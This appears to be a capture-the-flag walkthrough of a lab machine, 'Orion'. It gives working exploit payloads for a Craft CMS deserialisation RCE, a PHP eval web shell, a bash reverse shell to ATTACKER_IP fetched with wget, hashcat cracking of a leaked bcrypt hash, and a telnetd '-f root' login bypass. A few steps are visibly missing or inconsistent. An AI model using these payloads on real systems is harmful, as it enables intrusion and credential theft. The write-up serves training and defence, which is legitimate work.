Orion runs **Craft CMS 5.6.16** on top of **Yii Framework 2.0.51** with `CRAFT_DEV_MODE=true` — the framework versions are disclosed via the verbose 404 error page. Craft ≤ 5.6.16 is vulnerable to **CVE-2025-32432**, an unauthenticated deserialisation RCE in the `assets/generate-transform` action. Exploitation is a two-gadget chain: `GuzzleHttp\Psr7\FnStream::_fn_close = phpinfo` gives arbitrary-function-call for the vulnerability proof, then `yii\rbac\PhpManager::itemFile` combined with a session-file write via `GET /admin/dashboard?a=<?=eval($_GET['cmd']);die()?>` yields arbitrary PHP execution as `www-data`. Environment variables leak `CRAFT_DB_PASSWORD` for the local MariaDB; dumping the `users` table gives `adam`'s bcrypt-cost-13 hash that cracks to `darkangel` (hashcat mode 3200) and grants the user flag via `su adam`. Privilege escalation exploits **CVE-2026-24061**, an argument-injection in GNU inetutils telnetd 2.7 listening on `127.0.0.1:23`: `telnet -l '-f root' 127.0.0.1` propagates `-f root` through telnetd into the `login` invocation, where it means "authentication already succeeded, log in as root" — no password ever verified.

## Web Application — Yii Disclosure & Craft CMS Identification

### The 404 error page leaks the framework stack

Browsing `http://orion.htb/` loaded a corporate landing page for "Orion Telecom" with no obvious entry points. Trying an invalid URL to see how the application handles errors is a low-cost information-disclosure probe. The 404 response was the entire fingerprinting phase in one page:

![Craft CMS 404 error page showing an application stack trace with references to bootstrap.php, CRAFT_VENDOR_PATH, and a footer line disclosing "nginx/1.18.0" and "Yii Framework/2.0.51"](/assets/img/HTB/Orion/cap1.png)

The bottom of the page reveals **Yii Framework 2.0.51**. Two things follow from this:

1. **Yii is the underlying framework of Craft CMS.** The specific version — 2.0.51 — is a Craft version anchor because Craft ships specific Yii versions per release, and matching version tables narrow the Craft version candidate range immediately.
2. **The mere fact that the framework version is visible means Craft is running in `dev mode`.** In production, Craft renders a generic error page. The verbose stack trace with framework banner is opt-in behaviour behind `CRAFT_DEV_MODE=true`. Dev mode enables verbose errors, exposes debug endpoints, and — most usefully — signals that the operator has left safety catches disabled. Anything that assumes a hardened production posture on this box is a bad bet.

### Craft CMS 5.6.16 identification

A few PoCs for Craft-related CVEs mention `/index.php?p=admin` as an admin bootstrap. Trying that redirected to `/admin/login`, which rendered the Craft CMS admin panel:

![Orion Telecom Administration - Internal Website Management Portal login form with a Craft CMS logo and "Craft CMS 5.6.16" text in the footer](/assets/img/HTB/Orion/cap2.png)

**Craft CMS 5.6.16**. Version-specific vulnerability research surfaces **CVE-2025-32432**, an unauthenticated deserialisation RCE affecting Craft ≤ 5.6.16 (fixed in 5.6.17). The advisory identifies the vulnerable endpoint as `POST /index.php?p=actions/assets/generate-transform`.

## Exploitation — CVE-2025-32432 (Craft CMS Yii Deserialisation RCE)

### Understanding the vulnerability

Craft's `assets/generate-transform` action accepts a JSON body whose `handle` field is fed into Yii's **behavior attachment** system. Yii's `Yii::createObject()` uses reflection to instantiate arbitrary classes from a `class` key in a configuration array — this is by design, part of Yii's flexible object-graph configuration. The vulnerability is not the deserialiser itself; it's that this endpoint accepts **user-controlled JSON that Yii treats as an object-graph specification**.

An attacker who can specify a `class` name and constructor arguments gets to instantiate any PHP class in the application's autoload path. This is a classical **PHP object-injection primitive**, gated only by which classes have interesting side effects during construction or initialisation. In Craft's dependency graph, several such classes exist — and two of them chain into an unauthenticated RCE.

The endpoint is CSRF-protected, but CSRF protection is designed to stop cross-origin form submission by third-party sites, not to stop an attacker who can also make preliminary GET requests to the target. Anyone reaching the login page gets a valid CSRF token in the response.

### The CSRF token dance

Craft's CSRF protection is a **double-submit cookie**: a value stored in the `CRAFT_CSRF_TOKEN` cookie must match either an `X-CSRF-Token` header or a form field with the same value. To obtain a valid pair:

**Step 1** — issue an unauthenticated GET against `/admin/login`. The response sets a fresh `CraftSessionId` cookie:

![Burp Suite showing GET /admin/login response with Set-Cookie: CraftSessionId=21c0s533nb8aff8a39g97p1omu; path=/; HttpOnly](/assets/img/HTB/Orion/cap3.png)

**Step 2** — repeat the request carrying the just-issued `CraftSessionId`. The response body contains the `csrfTokenValue` embedded in the JavaScript configuration block that Craft's frontend uses to authenticate its own AJAX requests:

![Burp Suite response body containing "csrfTokenName":"CRAFT_CSRF_TOKEN","csrfTokenValue":"zjmvH9SP5-Ga2pBFiw58gxxUdbvmWsscJqSl6TQXt0FrViNM53kB_6Zv9yi81bKqrevDEtt9L9FIAEPwjRKPRWmX4oYEYdsPHBpBPrOUSrI="](/assets/img/HTB/Orion/cap4.png)

Both values — the `CraftSessionId` cookie *and* the CSRF token value from the response body — become the credentials the exploit needs.

### Phase 1 — phpinfo confirmation via the FnStream gadget

Before crafting a full RCE payload, a benign probe confirms exploitability. The first gadget is **`GuzzleHttp\Psr7\FnStream`**, a class from Guzzle (a Craft dependency) that wraps a stream with user-supplied callbacks. Its `_fn_close` property is invoked when the stream is closed, and the invocation is unchecked — anything callable is called. Setting `_fn_close = "phpinfo"` yields a proof-of-concept that runs `phpinfo()` on the server and returns its output in the HTTP response.

The JSON payload sent to `POST /index.php?p=actions/assets/generate-transform`:

```json
{
  "assetId": 1,
  "handle": {
    "width": 1,
    "height": 1,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [ [] ],
      "_fn_close": "phpinfo"
    }
  }
}
```

Two elements deserve highlighting. The outer wrapper (`craft\behaviors\FieldLayoutBehavior`, `as session`) is Craft's own machinery for attaching behaviours to models — this is what makes Yii's `createObject` trigger. The inner `__class` and `__construct()` fields specify what the attached behaviour actually is: an `FnStream` instance whose `_fn_close` is set to a callable name.

Delivering the payload with both cookies and the CSRF header:

![Burp Suite POST /index.php?p=actions/assets/generate-transform with X-CSRF-Token, cookies, and the FnStream JSON payload; response body contains a phpinfo page showing PHP Version 8.2.30 and Linux orion 5.15.0-177-generic](/assets/img/HTB/Orion/cap5.png)

The response includes the full phpinfo output — PHP 8.2.30 on Linux orion 5.15.0-177-generic. **The vulnerability is exploitable**, and the PHP configuration is now visible: the session storage path (`/var/lib/php/sessions/`), the enabled extensions, and the loaded php.ini settings.

### Phase 2 — session-file injection as a write primitive

phpinfo confirms code execution but only for zero-argument callable names. To reach arbitrary PHP evaluation, a second gadget class is needed — one that lets us execute a controlled string, not just a controlled function name.

**`yii\rbac\PhpManager`** is such a class. It's Yii's file-based role storage manager, and its constructor calls `load()` which does the equivalent of `require $this->itemFile`. Whatever PHP file the attacker points `itemFile` at gets included and executed. The challenge is that `require` needs a file **on the target's local filesystem** — it can't fetch a remote URL by default. To make PhpManager useful, a controlled file must already exist on disk.

PHP's session mechanism is the write primitive. PHP by default persists session data to `/var/lib/php/sessions/sess_{sid}` in a text serialisation format. If the application stores an attacker-controlled string as part of the session, that string ends up on disk in a predictable location — including any embedded `<?php ... ?>` tags.

Craft persists arbitrary GET parameters to the session across redirects (part of its "return URL" tracking). A GET request against any admin path with an `a=` parameter containing PHP tags will write those tags into the session file:

![Burp Suite GET /index.php?p=admin/dashboard&a=<?=eval($_GET['cmd']);die()?> returning HTTP 302 Found with Set-Cookie: CraftSessionId=i3ftive4tlepu21u2n4en9uj72](/assets/img/HTB/Orion/cap6.png)

The 302 redirect is expected — the endpoint requires authentication and bounces us back to /admin/login. But by the time the redirect happens, PHP has already created the session and persisted the request parameters. The new `CraftSessionId` cookie in the Set-Cookie header points at the freshly-written session file: `/var/lib/php/sessions/sess_i3ftive4tlepu21u2n4en9uj72`. That file now contains the literal string:

```
a|s:LEN:"<?=eval($_GET['cmd']);die()?>";
```

`<?= ?>` is PHP's short-echo syntax and evaluates its content — so once this file is `require`d, it will `eval()` whatever we pass in the `cmd` GET parameter and immediately `die()` to suppress the rest of the session data.

### Phase 3 — combining the gadgets for RCE

The new session needs its own CSRF token pair. Repeating the token dance from Phase 1 but with the new `CraftSessionId`:

![Burp Suite GET /admin/login with Cookie: CraftSessionId=i3ftive4tlepu21u2n4en9uj72 returning HTTP 200 and Set-Cookie: CRAFT_CSRF_TOKEN](/assets/img/HTB/Orion/cap7.png)

![Burp Suite response body containing csrfTokenValue="lp8EHbotcaVaNUKkG8Mn27L8-Ngc69NlvIcqTHfAy9n_ROLVFAbD2dXSNUTJHh3za3xy0Gr1ELLRtKmXJbG4ENDpZBsHiIqUjBvRj0RAr4Y="](/assets/img/HTB/Orion/cap8.png)

Now the final RCE payload — a different `__class` this time (`PhpManager`), with `itemFile` pointing at the session file we just wrote. The `cmd` query parameter carries the actual command to execute:

```
POST /index.php?p=actions/assets/generate-transform&cmd=system("id"); HTTP/1.1
```

```json
{
  "assetId": 1,
  "handle": {
    "width": 1,
    "height": 1,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "yii\\rbac\\PhpManager",
      "__construct()": [
        { "itemFile": "/var/lib/php/sessions/sess_i3ftive4tlepu21u2n4en9uj72" }
      ]
    }
  }
}
```

![Burp Suite POST /index.php?p=actions/assets/generate-transform&cmd=system("id"); with PhpManager itemFile payload; response body contains "uid=33(www-data) gid=33(www-data) groups=33(www-data)"](/assets/img/HTB/Orion/cap9.png)

The response contains `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — the output of `id` executed on the target. The chain works: session-file write via GET, then PhpManager includes the file, `eval()` runs the `cmd` parameter, output is returned in the response.

Note: a Metasploit module exists that automates this entire flow (both phases and the CSRF dance). Running the exploit manually is instructive but not strictly necessary for reproduction.

## From Web Shell to Reverse Shell

The `cmd=` primitive is a working web shell, but interactive command execution over URL-encoded HTTP requests is awkward. The standard pivot is to drop a reverse-shell script on disk and execute it once — trading the awkward interactive channel for a stable TCP callback.

The script is a one-liner:

```bash
cat reverseShell.sh
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

Served via Python's built-in HTTP server on the attacker box:

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

First attempt with `curl` — which fetches and prints to stdout but does not save the file.

The response is the fetched content, not a saved file — `curl` without `-o` is a display tool. Switching to `wget`, which saves by default:

![Burp Suite POST with cmd=system("wget+http://<ATTACKER_IP>:8000/reverseShell.sh"); response is HTTP 302 Found from Craft's post-request flash redirect](/assets/img/HTB/Orion/cap11.png)

The response is a Craft redirect (the eval-then-die shell fires and Craft's own error-handling flashes back to admin), but the download itself succeeded server-side. Making the script executable:

![Burp Suite POST with cmd=system("chmod+777+reverseShell.sh"); response is HTTP 302 Found](/assets/img/HTB/Orion/cap12.png)

Verifying with a directory listing:

![Burp Suite POST with cmd=system("ls+-l"); response body ends with "-rwxrwxrwx 1 www-data www-data 52 Jul 22 23:00 reverseShell.sh"](/assets/img/HTB/Orion/cap13.png)

The script is present and world-executable. Firing the listener on the attacker box:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

And triggering execution:

![Burp Suite POST with cmd=system("./reverseShell.sh"); response body ends with "-rwxrwxrwx 1 www-data www-data 52 Jul 22 23:00 reverseShell.sh"](/assets/img/HTB/Orion/cap14.png)

The listener caught the callback:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.54.99 55984
www-data@orion:~/html/craft/web$
```

A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Lateral Movement — `www-data` → `adam`

### Environment variable disclosure

The reflex check on any PHP-application shell is `env`, because framework-driven applications routinely pass credentials through environment variables at process boot:

```bash
env
SHELL=bash
CRAFT_ENVIRONMENT=dev
CRAFT_DB_PORT=3306
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
PWD=/var/www/html/craft/config
PRIMARY_SITE_URL=http://orion.htb/
CRAFT_DB_DATABASE=orion
HOME=/var/www
CRAFT_DB_TABLE_PREFIX=
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
TERM=xterm
USER=www-data
CRAFT_DB_USER=root
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8

CRAFT_DISALLOW_ROBOTS=true
CRAFT_DEV_MODE=true
```

Six values matter: `CRAFT_DB_USER=root`, `CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!`, `CRAFT_DB_DATABASE=orion`, `CRAFT_DB_SERVER=127.0.0.1`, `CRAFT_SECURITY_KEY` (Craft's application encryption key), and — confirming what the 404 error page suggested — `CRAFT_DEV_MODE=true` and `CRAFT_ALLOW_ADMIN_CHANGES=true`. The MySQL root credentials for the Craft database sit alongside the runtime configuration, unavoidably readable by anyone with a shell on the box.

The system's login users:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
adam:x:1000:1000::/home/adam:/bin/bash
```

`adam` is the only non-root login user — the target of any lateral move.

Connecting locally:

### Cracking with hashcat mode 3200

`hashcat` in autodetect mode returned the six candidate schemes that share the `$2y$...` shape:

```bash

[...]

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

Craft CMS uses `password_hash()` with `PASSWORD_DEFAULT`, which produces **plain bcrypt** — mode 3200:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
[...]
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel

Session..........: hashcat
Status...........: Cracked

Speed.#01........:       18 H/s
Recovered........: 1/1 (100.00%) Digests
```

`admin` : `darkangel`. Despite the cost-13 factor and the resulting 18 H/s throughput, the password was so weak (a rockyou entry near the start of the wordlist) that it fell in 39 seconds. Bcrypt's cost factor slows brute-force attempts; it does nothing about dictionary hits.

The recovered password worked directly against the OS-side `adam` account (the same real-world identity is behind both the Craft admin login and the system user):

```bash
su adam
Password: darkangel
adam@orion:~$ cat /home/adam/user.txt
```

## Privilege Escalation — `adam` → `root` (CVE-2026-24061)

### Discovering the loopback-only telnetd

Enumerating listening sockets as `adam`:

```bash
ss -nltp
State  Recv-Q  Send-Q  Local Address:Port    Peer Address:Port
LISTEN 0       10      127.0.0.1:23          0.0.0.0:*
LISTEN 0       4096    127.0.0.53%lo:53      0.0.0.0:*
LISTEN 0       80      127.0.0.1:3306        0.0.0.0:*
LISTEN 0       128     0.0.0.0:22            0.0.0.0:*
LISTEN 0       511     0.0.0.0:80            0.0.0.0:*
```

Port **23 on loopback** — telnetd. Telnet in 2026 is a smell all by itself; the protocol has no encryption, is universally deprecated for interactive use, and the daemon that serves it has had a rich vulnerability history. When it appears on a modern box, the exploitation opportunity is almost always in the daemon rather than in what an authenticated user can do afterward.

Fingerprinting the installed telnet package:

```bash
telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
```

**GNU inetutils 2.7** — the `inetutils` package release version, which lines up with **CVE-2026-24061**, an argument-injection vulnerability in `telnetd`.

### CVE-2026-24061 — argument injection through the USER environment variable

The bug is a classic argument-injection variant that has recurred throughout Unix history (`login`, `sudo -A`, `expect`, `su -c`, and — recently — `xdg-open`). GNU inetutils' telnetd forwards the client-supplied `USER` environment variable to the `login` program by appending it after the `-l` flag: `login -l <USER>`. If `USER` starts with a `-`, it's parsed by `login` as a flag rather than a username.

`login` supports a `-f` flag meaning **"authentication has already been performed, log the user in without a password prompt"**. This flag exists for programs like SSH's own login helper, `getty`, and PAM-aware SUS-shell wrappers — programs whose entire job is to authenticate on their own terms and then hand off to `login` for session setup. When `-f root` reaches `login`, the daemon skips password verification and drops directly into a root shell.

The telnet client's `-l` option sets the value of the `USER` environment variable transmitted during the telnet protocol negotiation. Setting it to `'-f root'` is the entire payload:

```bash
adam@orion:~$ telnet -l '-f root' 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/1)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
[...]

root@orion:~# whoami
root
root@orion:~# cat /root/root.txt
```

No password prompt. No authentication. No hash cracking. `telnetd` forwarded the poisoned `USER` value, `login` parsed it as a flag, and the shell dropped as `root`.

## Key Takeaways

- **Dev mode as a fingerprinting oracle.** `CRAFT_DEV_MODE=true` isn't a vulnerability by itself, but it removes the framework's usual defensive posture — verbose errors expose the framework version and stack trace, debug endpoints become reachable, and the operator's willingness to leave the safety catch off signals a broader configuration attitude. Every framework has an equivalent (Django's `DEBUG=True`, Rails' `Rails.env.development`, Laravel's `APP_DEBUG=true`, Flask's `debug=True`); their presence in production is the single most reliable signal for the "attack this application" decision.
- **The 404 page is a fingerprinting endpoint.** Applications spend heavy resources sanitising output on the "happy path" — the pages users are supposed to see — and then leak everything on the error path. Frameworks in dev mode routinely include the framework name and version at the bottom of 404 pages as a helpful debugging hint. Trying an invalid URL immediately after finding a web application is a two-second recon step that pays off constantly.
- **CSRF protection doesn't help when the attacker can also fetch a token.** Craft's CSRF check exists to stop cross-origin form POSTs from third-party sites, not to stop an attacker who can also make preliminary GETs to the target. Any CSRF scheme that doesn't require a real authentication factor as part of token generation — just a session and a random value — falls to the "GET the page, extract the token, POST with it" pattern. The correct fix at the design level is to tie CSRF tokens to authentication state, not to make the token harder to obtain.
- **The two-gadget primitive is a general RCE recipe against object-injection vulnerabilities.** When a single gadget can only give you one of "arbitrary function call" or "arbitrary file include", combining two of them — one to write something onto disk and one to include it — reaches arbitrary code execution. On this box, the session-write primitive was a Yii feature (persisting arbitrary GET parameters); the include primitive was Yii's own PhpManager. When auditing an object-injection sink, the question isn't just "does any gadget give me RCE directly" but also "which gadgets can I chain across primitives".
- **Session files are a general-purpose write primitive on PHP.** Any application that stores attacker-influenced data in `$_SESSION` — a return URL, a query string, a form value cached across a redirect — is writing that data to a predictable filesystem location. Once the session ID is known (returned in the Set-Cookie header of the response that created the session), `/var/lib/php/sessions/sess_<sid>` is the location. This is not a bug in PHP; it's how sessions have always worked. But it turns nearly any include-file-include primitive into full RCE when paired with a session-writing GET request.
- **`.env`-style credential loading is convenient and leaks reliably.** Craft — like Laravel, Rails, Node.js apps with `dotenv`, and every modern PHP/Ruby/JS framework — reads secrets from environment variables at process boot to "keep them out of code". The tradeoff is that once an attacker has RCE on the app, `env` returns every one of those secrets in one shot: DB credentials, application encryption keys, third-party API tokens, cloud SDK credentials. The mitigation is to load secrets from a dedicated secrets manager (Vault, AWS Secrets Manager, systemd credentials) that requires additional auth to read, rather than exposing them as inherited env vars.
- **Bcrypt's cost factor slows brute-force, but does nothing about the dictionary hit rate.** The `$2y$13$` prefix on adam's hash — cost factor 13, 8× more work than the more common cost 10 — meant hashcat achieved only 18 hashes per second. But `darkangel` sat near the top of `rockyou.txt`; the actual attack completed in 39 seconds. Password hashing exists to raise the cost of guessing *unknown* passwords; it can't protect known-weak passwords the way a strict password policy can.
- **Telnet is a smell.** The protocol has no encryption, is universally deprecated for interactive use, and modern operating-system installers actively refuse to include telnetd by default. When telnetd appears on a 2026 box, it's either (a) legacy that outlived its purpose or (b) deliberately installed for a reason worth investigating. In this case, the deliberate installation was the reason — CVE-2026-24061 turned it into an unauthenticated auth-bypass primitive. Any deprecated protocol still running should be treated as an attack surface, not as background noise.
- **Argument injection is a class of bug that spans decades and languages.** The pattern is always the same: process A takes a value from an untrusted source and passes it to process B as a command-line argument, where process B accepts flags that start with `-`. Historic instances: `login -f`, `sudo -A ATTACKER_ASKPASS`, `expect -c ATTACKER_TCL`, `find -exec`, `xdg-open`. The defensive discipline is to always separate flags from values on the receiver side using `--` (the standard "end of options" marker), and to validate that user-controlled values do not start with `-` on the sender side. Neither telnetd 2.7 nor the vast majority of programs that concatenate arguments implement either check.
